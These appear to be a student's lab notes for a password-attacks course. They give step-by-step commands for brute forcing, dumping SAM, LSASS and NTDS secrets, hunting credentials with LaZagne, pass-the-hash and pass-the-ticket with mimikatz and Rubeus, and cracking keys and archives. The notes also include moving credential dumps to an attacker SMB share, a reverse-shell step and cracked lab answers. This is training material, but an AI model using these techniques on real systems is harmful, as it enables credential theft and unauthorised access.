# PW Attacks

## Theory

### Protection theory

* CIA triade (Confidentiality, Integrity, Availability)
* Authentication
  * sth you KNOW (credentials)
  * sth you HAVE (app like Google auth)
  * sth you ARE (biometrics)
* PW Statistics (US)&#x20;
  * [https://www.pandasecurity.com/en/mediacenter/password-statistics/](https://www.pandasecurity.com/en/mediacenter/password-statistics/)
  * 24% americans use PW: 12345678, password, qwertyqwerty
  * [https://storage.googleapis.com/gweb-uniblog-publish-prod/documents/PasswordCheckup-HarrisPoll-InfographicFINAL.pdf](https://storage.googleapis.com/gweb-uniblog-publish-prod/documents/PasswordCheckup-HarrisPoll-InfographicFINAL.pdf)
  * combination pet / child + address number
  * 33% use their pets / children
  * 22% own name



### Credential storage

* rockyou.txt

#### Linux

* /etc/shadow
*   hashes

    <figure><img src=".gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

* /etc/passwd
*

    <figure><img src=".gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>





#### Windows

<figure><img src=".gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>

* LSASS
* SAM database
* NTDS
* C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\\

### John The Ripper

* \*1996
* Attack Methods (Dictionary, Brute-force, Rainbow table)

## Remote PW attacks

### Network services

#### Questions

Find the user for the **WinRM** service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

<figure><img src=".gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

`evil-winrm -u john -i 10.129.218.11 -p november`

<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Find the user for the **SSH** service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

`hydra -L username.list -P password.list ssh://10.129.238.248`

<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

`ssh dennis@10.129.238.248`

* password & login
* `cd Desktop`
* `type flag.txt`

Find the user for the **RDP** service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

`hydra -L username.list -P password.list rdp://10.129.238.248`

<figure><img src=".gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Reminna to login

<figure><img src=".gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Find the user for the **SMB** service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

* hydra could do it, but cant handle SMBv3 replies

`msfconsole -q`

`use auxiliary/scanner/smb/smb_login`

`options`

`set user_file username.list`

`set pass_file password.list`

`set rhosts 10.129.238.248`

`run`

<figure><img src=".gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

`smbclient -U cassie -L \10.129.238.248`

`smbclient -U cassie \\\\10.129.238.248\\SHARENAME`

_flag is right here_

### Password Mutations

#### Questions

**Create a mutated wordlist using the files in the ZIP file under "Resources" in the top right corner of this section. Use this wordlist to brute force the password for the user "sam". Once successful, log in with SSH and submit the contents of the flag.txt file as your answer.**

Create mutated password-list:

`hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list`

Remove PWs shorter than 10 chars

`sed -ri '/^.{,9}$/d' mut_password.list`

Use only first 7000

`head -7000 mut_password.list`

Bruteforce FTP

`hydra -l sam -P ./mut_password.list ftp://<IP> -t 64`

<figure><img src=".gitbook/assets/image (170).png" alt=""><figcaption></figcaption></figure>

**Connect to SSH:**

`ssh sam@10.129.131.233`

`cd smb`

`cat flag.txt`

### PW Reuse / Default PWs

* Credential stuffing - using Hydra
* [https://github.com/ihebski/DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
*

    <figure><img src=".gitbook/assets/image (171).png" alt=""><figcaption></figcaption></figure>

#### Questions

**Use the user's credentials we found in the previous section and find out the credentials for MySQL. Submit the credentials as the answer.**&#x20;

`ssh sam@10.129.131.233`

`mysql -u -p`

* \-u and -p can be found in given cheetsheat
  * [https://raw.githubusercontent.com/ihebski/DefaultCreds-cheat-sheet/main/DefaultCreds-Cheat-Sheet.csv](https://raw.githubusercontent.com/ihebski/DefaultCreds-cheat-sheet/main/DefaultCreds-Cheat-Sheet.csv)
  *

      <figure><img src=".gitbook/assets/image (172).png" alt=""><figcaption></figcaption></figure>

`mysql -u superdba -p admin`

* works...

Answer: <mark style="color:green;">**superdba:admin**</mark>

## Win Local PW Attacks

### Attacking SAM

* Copying SAM Registry Hives (hklm/sam, hklm/system, khlm/security)
* Creating backups of Hives using reg.exe
  * `reg.exe save hklm/sam C:/sam.save`
* Creating a Share w smbserver.py
  * `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/`
* Moving Hive copies to Share
  * `move sam.save \10.10.15.16\CompData`
* Dumping Hashes w Impackets secretsdump.py
  * `python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`
* Cracking hashes w Hashcat
  * `sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt`
* Remote Dumping & LSA Secrets
  * `crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa`
  * `crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam`

#### Questions

**Where is the SAM database located in the Windows registry? (Format: \*\*\*\*\*\*\*)**

<mark style="color:green;">**hklm\sam**</mark>

**Apply the concepts taught in this section to obtain the password to the ITbackdoor user account on the target. Submit the clear-text password as the answer.**

Remmina -> Connect using RDP to Win machine

`sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/zihuatanejo`

`move sam.save \\10.10.15.16\CompData`

`move security.save \\10.10.15.16\CompData`

`move system.save \\10.10.15.16\CompData`

`python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`

* ![](<.gitbook/assets/image (173).png>)

`nano haskestocrack.txt`

* store the HTLM hashes (last strings) into the txt file...

`sudo hashcat -m 1000 hashestocrack.txt Desktop/rockyou.txt`

Administrator:mommy1

ITbackdoor:<mark style="color:green;">**matrix**</mark>

frontdesk:Password123

**Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive)**

<mark style="color:green;">**frontdesk:Password123**</mark>

### Attacking LSASS

#### LSASS capabilities

after initial login, LSASS will:

* cache creds locally in memory
* create access tokens
* enforce security policies
* write to win sec log

<figure><img src=".gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

#### Dumping LSASS Process memory

a) Task Manager -> find a process there - right-click - create dump file, file is saved in C:/users/\<user>/AddData/Local/Temp

b) Rundll32.exe & Comsvcs.dll -> Rundll32.exe is cmd utility for dumping lsass memory, first we need to find ProcessID (PID) of lsass.exe (tasklist /svc)

c) creating lsass.dmp using powershell -> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

d) PYPYKATZ -> pypykatz lsa minidump /home/peter/Documents/lsass.dmp



Then we can crack the NT Hash with Hashcat

`sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt`

#### Questions

**What is the name of the executable file associated with the Local Security Authority Process?**

<mark style="color:green;">**lsass.exe**</mark>

**Apply the concepts taught in this section to obtain the password to the Vendor user account on the target. Submit the clear-text password as the answer. (Format: Case sensitive)**

* Connect using RDP
* Task manager
  *   LSASS -> right-click -> Create dump file

      <figure><img src=".gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

      <figure><img src=".gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>
*   File transfer to our attack Linux machine from Windows RDP...

    * sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/zihuatanejo

    <figure><img src=".gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>



    * `move lsass.dmp \\10.10.15.83\CompData`

    <figure><img src=".gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>



    * Check in linux terminal -> ls
* `pypykatz lsa minidump /home/zihuatanejo/lsass.DMP`

<figure><img src=".gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

* Copy NT hash (31f87811133bc6aaa75a536e77f64314) to hash.txt file
* sudo hashcat -m 1000 hash.txt ./Desktop/rockyou.txt
  *

      <figure><img src=".gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

### Attacking AD & NTDS.dit

#### AD

* dir service in modern enterprise networks
* if organisation uses Win, then AD is used to manage those Win systems...
* once in domain, it will no longer reference the SAM db to validate logon requests...
  * Example: WS01/user52

Attacking using crackmapexec

#### Questions

**What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts? (Format: \*\*.\*)**

* ntds.dit

**Submit the NT hash associated with the Administrator user from the example output in the section reading.**

<figure><img src=".gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure>

* 64f12cddaa88057e06a81b54e73b949b

**On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive)**

* `git clone` [`https://github.com/urbanadventurer/username-anarchy.git`](https://github.com/urbanadventurer/username-anarchy.git)
* nano usernames.txt
*

    <figure><img src=".gitbook/assets/image (325).png" alt=""><figcaption></figcaption></figure>


* ./username-anarchy -i /home/zihuatanejo/HTB\_local/Academy/AD/usernames.txt
*

    <figure><img src=".gitbook/assets/image (326).png" alt=""><figcaption></figcaption></figure>


* `poetry run crackmapexec smb 10.129.202.85 -u jmarston -p /usr/share/wordlists/fasttrack.txt`

<figure><img src=".gitbook/assets/image (327).png" alt=""><figcaption></figcaption></figure>



* jmarston:P@ssword!

**Capture the NTDS.dit file and dump the hashes. Use the techniques taught in this section to crack Jennifer Stapleton's password. Submit her clear-text password as the answer. (Format: Case-Sensitive)**

* `poetry run crackmapexec smb 10.129.202.85 -u jmarston -p P@ssword! --ntds`
*

    <figure><img src=".gitbook/assets/image (328).png" alt=""><figcaption></figcaption></figure>


*

    <figure><img src=".gitbook/assets/image (329).png" alt=""><figcaption></figcaption></figure>


* `sudo hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /home/z`
* `ihuatanejo/Desktop/rockyou.txt`

<figure><img src=".gitbook/assets/image (330).png" alt=""><figcaption></figcaption></figure>

* Winter2008

### Credential Hunting in Windows

#### Questions

**What password does Bob use to connect to the Switches via SSH? (Format: Case-Sensitive)**

* xfreerdp /v:10.129.177.167 /u:BOB /p:HTB\_@cademy\_stdnt!
  * or Reminna
* Attack host: download Lazagne.exe (portable release)

<figure><img src=".gitbook/assets/image (331).png" alt=""><figcaption></figcaption></figure>

* copy Lazagne.exe to Win target machine
  * `xfreerdp /v:10.129.177.167 /u:BOB /p:HTB_@cademy_stdnt! /dynamic-resolution /drive:/home/zihuatanejo/Desktop/Tools`
  *

      <figure><img src=".gitbook/assets/image (332).png" alt=""><figcaption></figcaption></figure>

      <figure><img src=".gitbook/assets/image (333).png" alt=""><figcaption></figcaption></figure>
* Run LaZagne.exe
  * `start LaZagne.exe all -oA -output C:\Users\bob\Desktop`

<figure><img src=".gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (338).png" alt=""><figcaption></figcaption></figure>

* WellConnected123

**What is the GitLab access code Bob uses? (Format: Case-Sensitive)**

* Desktop - WorkStuff - GitlabAccessCodeJustIncase

<figure><img src=".gitbook/assets/image (339).png" alt=""><figcaption></figcaption></figure>

* 3z1ePfGbjWPsTfCsZfjy

**What credentials does Bob use with WinSCP to connect to the file server? (Format: username:password, Case-Sensitive)**

<figure><img src=".gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>



* LaZagne.exe above...
* ubuntu:FSadmin123

**What is the default password of every newly created Inlanefreight Domain user account? (Format: Case-Sensitive)**

* ThisPC - C - Automations\&Scripts - BulkaddADusers

<figure><img src=".gitbook/assets/image (340).png" alt=""><figcaption></figcaption></figure>

* Inlanefreightisgreat2022

**What are the credentials to access the Edge-Router? (Format: username:password, Case-Sensitive)**

* ThisPC - C - Automations\&Scripts - Scripts - EdgeRouterConfigs

<figure><img src=".gitbook/assets/image (341).png" alt=""><figcaption></figcaption></figure>

* edgeadmin:Edge@dmin123!

## Linux Local PW Attacks

### Credential Hunting in linux

Config files

for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name \*$l 2>/dev/null | grep -v "lib|fonts|share|core" ;done

Creds in config files

for i in $(find / -name \*.cnf 2>/dev/null | grep -v "doc|lib");do echo -e "\nFile: " $i; grep "user|password|pass" $i 2>/dev/null | grep -v "#";done

Databases

for l in $(echo ".sql .db ._db .db_");do echo -e "\nDB File extension: " $l; find / -name \*$l 2>/dev/null | grep -v "doc|lib|headers|share|man";done

Notes

find /home/\* -type f -name "_.txt" -o ! -name "_.\*"

Scripts

for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name \*$l 2>/dev/null | grep -v "doc|lib|headers|share";done

SSH Private keys

grep -rnw "PRIVATE KEY" /home/\* 2>/dev/null | grep ":1"

SSH Public keys

grep -rnw "ssh-rsa" /home/\* 2>/dev/null | grep ":1"

BASH HISTORY

tail -n5 /home/_/.bash_

_LOGS_

for i in $(ls /var/log/\* 2>/dev/null);do GREP=$(grep "accepted|session opened|session closed|failure|failed|ssh|password changed|new user|delete user|sudo|COMMAND=|logs" $i 2>/dev/null); if \[\[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted|session opened|session closed|failure|failed|ssh|password changed|new user|delete user|sudo|COMMAND=|logs" $i 2>/dev/null;fi;done

MEMORY

sudo python3 mimipenguin.py

sudo bash mimipenguin.py

sudo python3 laZagne.py all

BROWSERS

ls -l .mozilla/firefox/ | grep default

cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

python3.9 firefox\_decrypt.py

python3 laZagne.py browsers

#### Questions

**Examine the target and find out the password of the user Will. Then, submit the password as the answer.**

* HINT
  * Sometimes, we will not have any initial credentials available, and as the last step, we will need to bruteforce the credentials to available services to get access. From other hosts on the network, our colleagues were able to identify the user "Kira", who in most cases had SSH access to other systems with the password "LoveYou1". We have already provided a prepared list of passwords in the "Resources" section for simplicity's purpose.
* LoveYou1
*   Mutate the PW to obtain correct SSH login of Kira user



    * nano password.list (insert LoveYou1)
    * hashcat --force password.list -r custom.rule --stdout | sort -u > mutated.list
    * hydra -l kira -P mutated.list ssh://10.129.115.79 -t 64

    <figure><img src=".gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

    \-
* SSH to kira
  * ssh kira@10.129.115.79
    * PW: L0vey0u1!
*   BASH history

    * cat _.bash-history_

    <figure><img src=".gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

    * we have to upload the firefox\_decrypt tool into kira box
      * after running it, we should obtain Willy PW from browser history...
* Uploading firefox\_decrypt tool
  * git clone firefox%decrypt (URL from github repo)
  * python3 -m http.server
  * wget [http://10.10.15.83:8000/firefox\_decrypt.py](http://10.10.15.83:8000/firefox\_decrypt.py)
  *   python 3.9 firefox\_decrypt.py

      * option 2

      <figure><img src=".gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

### Passwd, Shadow & Opasswd

* PAM
  * Pluggable Authentication Modules
  * /usr/lib/x86\_x64-linux-gnu/security/
  * if you want to change PW in Linux -> PAM is called and stores and handles the info
  * standard files that are read, managed and updated:
    * /etc/passwd
    * /etc/shadow
  * can have other service modules, such as LDAP, mount, Kerberos...
*   Passwd file

    <figure><img src=".gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>


* Shadow file

<figure><img src=".gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

* Opasswd
  * old PW stored here
  * /etc/security/opasswd
*   UNSHADOW

    * sudo cp /etc/shadow /tmp/shadow.bak
    * unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
    * hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked



#### Questions

**Examine the target using the credentials from the user Will and find out the password of the "root" user. Then, submit the password as the answer.**

* ssh will@10.129.115.79
  * PW: TUqr7QfLTLhruhVbCP
* ls -la
* cd .backups
* ls -la
* cat passwd.bak
* cat shadow.bak
  * root HASH here
    * $6$XePuRx/4eO0WuuPS$a0t5vIuIrBDFx1LyxAozOu.cVaww01u.6dSvct8AYVVI6ClJmY8ZZuPDP7IoXRJhYz4U8.DJUlilUw2EfqhXg.
      * nano hash.txt
* Decrypt Hash
  * generate mutated list
    * hashcat --force password.list -r custom.rule --stdout | sort -u > mut\_password.list
  * hashcat -m 1800 hash.txt mut\_password.list
    * <mark style="color:green;">**J0rd@n5**</mark>

<figure><img src=".gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

## Windows Lateral Movement

### Pass the hash (PtH)

#### Questions

**Access the target machine using any Pass-the-Hash tool. Submit the contents of the file located at C:\pth.txt.**

`impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453`

<mark style="color:green;">**G3t\_4CCE\$$\_V1@\_PTH**</mark>



**Try to connect via RDP using the Administrator hash. What is the name of the registry value that must be set to 0 for PTH over RDP to work? Change the registry key value and connect using the hash with RDP. Submit the name of the registry value name as the answer.**

<figure><img src=".gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>

<mark style="color:green;">**DisableRestrictedAdmin**</mark>

**Connect via RDP and use Mimikatz located in c:\tools to extract the hashes presented in the current session. What is the NTLM/RC4 hash of David's account?**

`reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`

`xfreerdp /v:10.129.92.104 /u:administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453`

`run mimikatz`

privilege::debug

sekurlsa::logonpasswords full

<figure><img src=".gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (176).png" alt=""><figcaption></figcaption></figure>

<mark style="color:green;">**c39f2beb3d2ec06a62cb887fb391dee0**</mark>

**Using David's hash, perform a Pass the Hash attack to connect to the shared folder \DC01\david and read the file david.txt.**

*   MIMIKATZ

    * `sekurlsa::pth /user:david /rc4:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.local /run:cmd.exe`

    <figure><img src=".gitbook/assets/image (179).png" alt=""><figcaption></figcaption></figure>

    * `dir \dc01\david`
    * `type \dc01\david\david.txt`

<figure><img src=".gitbook/assets/image (178).png" alt=""><figcaption></figcaption></figure>

<mark style="color:green;">**D3V1d\_Fl5g\_is\_Her3**</mark>

**Using Julio's hash, perform a Pass the Hash attack to connect to the shared folder \DC01\julio and read the file julio.txt.**

* `sekurlsa::pth /user:julio /rc4:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.local /run:cmd.exe`
  * `type \dc01\julio\julio.txt`

<figure><img src=".gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>

<mark style="color:green;">**JuL1()\_SH@re\_fl@g**</mark>

**Using Julio's hash, perform a Pass the Hash attack, launch a PowerShell console and import Invoke-TheHash to create a reverse shell to the machine you are connected via RDP (the target machine, DC01, can only connect to MS01). Use the tool nc.exe located in c:\tools to listen for the reverse shell. Once connected to the DC01, read the flag in C:\julio\flag.txt.**

* Julios hash: 64f12cddaa88057e06a81b54e73b949b
*   Craft reverse shell

    * [https://www.revshells.com/](https://www.revshells.com/)
    * set IP + port

    <figure><img src=".gitbook/assets/image (181).png" alt=""><figcaption></figcaption></figure>

    * option PowerShell #3 (Base64)

    <figure><img src=".gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>



    * Netcat listener

    <figure><img src=".gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>


* Run command

<figure><img src=".gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

*   Obtain reverse Shell & get flag

    <figure><img src=".gitbook/assets/image (185).png" alt=""><figcaption></figcaption></figure>

<mark style="color:green;">**JuL1()\_N3w\_fl@g**</mark>

### Pass the Ticket (PtT) from Windows

#### Questions

**Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect?**

* Reminna login via RDP
* run C:/tools/mimikatz.exe

```cmd-session
privilege::debug
sekurlsa::tickets /export
```

<figure><img src=".gitbook/assets/image (186).png" alt=""><figcaption></figcaption></figure>

**Answer: 3**

<figure><img src=".gitbook/assets/image (187).png" alt=""><figcaption></figcaption></figure>

**Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder \DC01.inlanefreight.htb\john**

```cmd-session
privilege::debug
sekurlsa::ekeys
```

* john
  * aes256\_hmac: 9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc
  * rc4\_hmac\_nt: **c4b0e1b10c7ce2c4723b4e2407ef81a2**
* `Rubeus.exe asktgt /domain:inlanefreight.htb /user:john /rc4:c4b0e1b10c7ce2c4723b4e2407ef81a2 /ptt`
* `dir \DC01.inlanefreight.htb\john`
* `type \DC01.inlanefreight.htb\john\john.txt`

<figure><img src=".gitbook/assets/image (188).png" alt=""><figcaption></figcaption></figure>

<mark style="color:green;">**Learn1ng\_M0r3\_Tr1cks\_with\_J0hn**</mark>

**Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt**

`privilege::debug`

`kerberos::ptt "C:\Users\Administrator.WIN01\Desktop[0;7500d]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"`

<figure><img src=".gitbook/assets/image (189).png" alt=""><figcaption></figcaption></figure>

`exit`

`powershell`

`cd C:/john/`

`dir`

`type john.exe`

<figure><img src=".gitbook/assets/image (190).png" alt=""><figcaption></figcaption></figure>

<mark style="color:green;">**P4\$$\_th3\_Tick3T\_PSR**</mark>

### Pass the Ticket (PtT) from Linux

Questions

**Connect to the target machine using SSH to the port TCP/2222 and the provided credentials. Read the flag in David's home directory.**

`ssh david@inlanefreight.htb@10.129.218.18 -p 2222`

PW: Password2

<figure><img src=".gitbook/assets/image (191).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (192).png" alt=""><figcaption></figcaption></figure>

**Which group can connect to LINUX01?**

`realm list`

<figure><img src=".gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>

**Look for a keytab file that you have read and write access. Submit the file name as a response.**

`find / -name`` `_`keytab`_` ``-ls 2>/dev/null`

<figure><img src=".gitbook/assets/image (194).png" alt=""><figcaption></figcaption></figure>

* read\&write -> CARLOS.KEYTAB

**Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's home directory.**

`python3 /opt/keytabextract.py carlos.keytab`

<figure><img src=".gitbook/assets/image (195).png" alt=""><figcaption></figcaption></figure>

`nano hash.txt`&#x20;

`hashcat hash.txt -m 1000 -a 0 /usr/share/wordlists/rockyou.txt`

<figure><img src=".gitbook/assets/image (196).png" alt=""><figcaption></figcaption></figure>

Password5

<figure><img src=".gitbook/assets/image (197).png" alt=""><figcaption></figcaption></figure>

**Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc\_workstations and use them to authenticate via SSH. Submit the flag.txt in svc\_workstations' home directory.**

`crontab -l`

`python3 /opt/keytabextract.py svc_workstations._all.kt`

<figure><img src=".gitbook/assets/image (198).png" alt=""><figcaption></figcaption></figure>

`nano hash.txt`

`hashcat hash.txt -m 1000 -a 0 /usr/share/wordlists/rockyou.txt`

<figure><img src=".gitbook/assets/image (199).png" alt=""><figcaption></figcaption></figure>

Password4





| User   | PW        |
| ------ | --------- |
| david  | Password2 |
| john   | Password3 |
| svc    | Password4 |
| carlos | Password5 |
|        |           |

<figure><img src=".gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (201).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (202).png" alt=""><figcaption></figcaption></figure>

* `cp /var/lib/sss/db/ccache_INLANEFREIGHT.HTB .`

<figure><img src=".gitbook/assets/image (203).png" alt=""><figcaption></figcaption></figure>

## Cracking Files

### Protected Files

`ssh kira@10.129.16.180`

PW: **L0vey0u1!**

<figure><img src=".gitbook/assets/image (206).png" alt=""><figcaption></figcaption></figure>

* id\_rsa path: /home/kira/.ssh/id\_rsa
* CRACK the RSA
  * copy id\_rsa to local machine
  * create hash from RSA priv key...
    * `/usr/share/john/ssh2john.py id_rsa > ssh.hash`
  * run john
    * &#x20;`john --wordlist=/home/zihuatanejo/Desktop/rockyou.txt ssh.hash`

<figure><img src=".gitbook/assets/image (207).png" alt=""><figcaption></figcaption></figure>

### Protected Archives

`ssh kira@10.129.16.180`

PW: **L0vey0u1!**

<figure><img src=".gitbook/assets/image (208).png" alt=""><figcaption></figcaption></figure>

* copy Notes.zip to lcoal machine
  * wget kira@10.129.31.239:/home/kira/Documents/Notes.zip --password="L0vey0u1!"
* Create hash from zip file
  *

      <figure><img src=".gitbook/assets/image (209).png" alt=""><figcaption></figcaption></figure>


* Create mutated PW list
  * download file from Resources
  *

      <figure><img src=".gitbook/assets/image (210).png" alt=""><figcaption></figcaption></figure>
* Crack the hash
  * `john --wordlist=mut_password.list zip.hash`
  *

      <figure><img src=".gitbook/assets/image (211).png" alt=""><figcaption></figcaption></figure>
* Obtain flag
  * `unzip Notes.zip && cat notes.txt`

## Password Management

### Password Policies

### Password Managers

## Skills Assessment

### PW Attacks lab - EASY

**Examine the first target and submit the root password as the answer.**

`nmap 10.129.104.203 -sVC`

* 21 FTP
* 22 SSH

`hydra -L username.list -P password.list ssh://10.129.189.211`

`hydra -L username.list -P password.list ftp://10.129.189.211`

mike:7777777

`ftp 10.129.189.211`

<figure><img src=".gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

`chmod u+x id_rsa`

`sudo ssh -i id_rsa mike@10.129.189.211`

passphrase: same as password

* we could obtain it with ssh2john -> get hash from rsa -> decrypt hash -> 7777777

<figure><img src=".gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>



`cat ~/.bash_history`

<figure><img src=".gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>

### PW Attacks lab - MEDIUM

**Examine the second target and submit the contents of flag.txt in /root/ as the answer.**

`nmap -sVC 10.129.202.221`

<figure><img src=".gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* SSH, SMB

METASPLOIT

`msfconsole -q`

`use auxiliary/scanner/smb/smb_login`

`options`

`set user_file username.list`

`set pass_file password.list`

`set rhosts 10.129.238.248`

`run`

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

`smbclient \\\\10.129.202.221\\SHAREDRIVE -U john`

&#x20;![](<.gitbook/assets/image (2) (1) (1) (1) (1).png>)

`smbclient \\\\10.129.202.221\\SHAREDRIVE -U john --password 123456 -c 'get Docs.zip'`

`unzip`

\----PW-----

zip2john Docs.zip > docs.hash

hashcat --force password.list -r custom.rule --stdout | sort -u > mut\_password.list

john --wordlist=mut\_password.list docs.has

* PW = Destiny2022!

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

unzip&#x20;

open Documentation.docx

* encrypted, we have to decrypt it via john
  * /usr/share/john/office2john.py Documentation.docx > pass.txt
  * john pass.txt

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

* open the Documentation.docx

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

* jason:C4mNKjAtL2dydsYa6

ssh jason@10.129.202.221

mysql -u jason -p&#x20;

* C4mNKjAtL2dydsYa6

MYSQL

* show databases;
* use users;
* show tables;
* select \* from creds;
  * dennis:7AUgWWQEiMPdqx
* exit MySQL & SSH jason

SSH Dennis

* ssh dennis@10.129.202.221
  * PW obtained from MySQL DB

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

* scp obtained id\_rsa to your machine

<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

* /usr/share/john/ssh2john.py id\_rsa > id\_rsa.hash
* john --wordlist=mut\_password.list PWmedium/id\_rsa.hash

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

ROOT SSH

* ssh root@10.129.202.221 -i id\_rsa
  * enter obtained Passphrase
  * cat flag.txt

### PW Attacks lab - HARD

* `nmap -sVC 10.129.202.222`

<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

* result: RDP + SMBv2

CME

* `poetry run crackmapexec -u johanna -p mut_password.list --shares`
  * we obtained johanna PW

<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

* she didn’t have access to the shared drives. Interestingly, we also stumbled upon a directory named `david`. Subsequently, we used `johanna`’s credentials to attempt an RDP session.

RDP

```bash
xfreerdp /v:10.129.202.222 /u:johanna /p:1231234!
```

* Documents (folder) - KeePass DB file named logins.kdbx
  *   transfer it to our host machine

      * PS - Base64 encoding for the transfer

      ```powershell
